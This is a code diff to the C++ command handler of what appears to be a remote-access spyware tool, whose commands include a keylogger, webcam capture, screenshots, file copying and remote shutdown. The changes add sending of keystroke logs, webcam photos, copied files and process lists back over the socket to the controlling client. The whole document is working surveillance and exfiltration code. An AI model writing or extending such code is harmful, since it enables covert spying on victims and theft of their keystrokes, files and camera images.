@@ -222,15 +222,15 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         std::string helpMsg = 
             "Available commands:\n"
             "  help                    - Show this help message\n"
-            "  list_services           - List all running services\n"
+            "  list_services           - List all running services and send file to client\n"
             "  start <path>            - Start a process from given path\n"
             "  stop <process_name>     - Stop a process by name\n"
-            "  list_apps               - List all visible applications\n"
-            "  copyfile <source>       - Copy file from source to current directory\n"
+            "  list_apps               - List all visible applications and send file to client\n"
+            "  copyfile <source>       - Copy file from source and send to client\n"
             "  start_keylogger         - Start keylogger\n"
-            "  stop_keylogger          - Stop keylogger\n"
+            "  stop_keylogger          - Stop keylogger and send log file to client\n"
             "  screenshot              - Capture screen, save as PNG and send to client\n"
-            "  webcam_photo            - Capture single webcam photo\n"
+            "  webcam_photo            - Capture webcam photo and send to client\n"
             "  restart                 - Restart the system\n"
             "  shutdown                - Shutdown the system\n"
             "  start_record            - Start screen recording\n"
@@ -242,7 +242,22 @@ void handleCommand(SOCKET sock, const std::string& cmd)
     else if (cmd == "list_services")
     {
         std::string processes = listProcesses();
+        std::string filename = "process_list.txt";
         sendResponse(sock, processes);
+        
+        // Send the process list file to client if it exists
+        if (fileExists(filename))
+        {
+            if (sendFileToClient(sock, filename))
+            {
+                std::cout << "Process list file sent to client." << std::endl;
+            }
+            else
+            {
+                std::string errorMsg = "Failed to send process list file to client.";
+                sendResponse(sock, errorMsg);
+            }
+        }
     }
     else if (cmd.rfind("start ", 0) == 0)
     {
@@ -262,7 +277,22 @@ void handleCommand(SOCKET sock, const std::string& cmd)
     else if (cmd == "list_apps")
     {
         std::string apps = listUserApps();
+        std::string filename = "list_apps.txt";
         sendResponse(sock, apps);
+        
+        // Send the apps list file to client if it exists
+        if (fileExists(filename))
+        {
+            if (sendFileToClient(sock, filename))
+            {
+                std::cout << "Apps list file sent to client." << std::endl;
+            }
+            else
+            {
+                std::string errorMsg = "Failed to send apps list file to client.";
+                sendResponse(sock, errorMsg);
+            }
+        }
     }
     else if (cmd.rfind("copyfile ", 0) == 0)
     {
@@ -270,8 +300,27 @@ void handleCommand(SOCKET sock, const std::string& cmd)
         std::string destPath = fs::current_path().string() + "/" + fs::path(sourcePath).filename().string();
         
         bool ok = copyFile(sourcePath, destPath);
-        std::string msg = ok ? "File copied successfully: " + destPath : "Failed to copy file.";
-        sendResponse(sock, msg);
+        if (ok)
+        {
+            std::string msg = "File copied successfully: " + destPath;
+            sendResponse(sock, msg);
+            
+            // Send the copied file to client
+            if (sendFileToClient(sock, destPath))
+            {
+                std::cout << "Copied file sent to client." << std::endl;
+            }
+            else
+            {
+                std::string errorMsg = "Failed to send copied file to client.";
+                sendResponse(sock, errorMsg);
+            }
+        }
+        else
+        {
+            std::string msg = "Failed to copy file.";
+            sendResponse(sock, msg);
+        }
     }
     else if (cmd == "exit")
     {
@@ -289,8 +338,28 @@ void handleCommand(SOCKET sock, const std::string& cmd)
     else if (cmd == "stop_keylogger")
     {
         stopKeylogger();
+        std::string filename = "keylog.txt";
         std::string msg = "Keylogger stopped.";
         sendResponse(sock, msg);
+        
+        // Send the keylog file to client if it exists
+        if (fileExists(filename))
+        {
+            if (sendFileToClient(sock, filename))
+            {
+                std::cout << "Keylog file sent to client." << std::endl;
+            }
+            else
+            {
+                std::string errorMsg = "Failed to send keylog file to client.";
+                sendResponse(sock, errorMsg);
+            }
+        }
+        else
+        {
+            std::string errorMsg = "No keylog file found.";
+            sendResponse(sock, errorMsg);
+        }
     }
     else if (cmd == "screenshot")
     {
@@ -351,10 +420,27 @@ void handleCommand(SOCKET sock, const std::string& cmd)
     {
         std::string filename = "webcam_photo.jpg"; // Default filename
         bool success = captureWebcamPhoto(filename);
-        std::string msg = success ? 
-            "Webcam photo captured successfully: " + filename : 
-            "Failed to capture webcam photo.";
-        sendResponse(sock, msg);
+        if (success)
+        {
+            std::string msg = "Webcam photo captured successfully: " + filename;
+            sendResponse(sock, msg);
+            
+            // Send the webcam photo to client
+            if (sendFileToClient(sock, filename))
+            {
+                std::cout << "Webcam photo sent to client." << std::endl;
+            }
+            else
+            {
+                std::string errorMsg = "Failed to send webcam photo to client.";
+                sendResponse(sock, errorMsg);
+            }
+        }
+        else
+        {
+            std::string msg = "Failed to capture webcam photo.";
+            sendResponse(sock, msg);
+        }
     }
     else if(cmd == "start_record")
     {
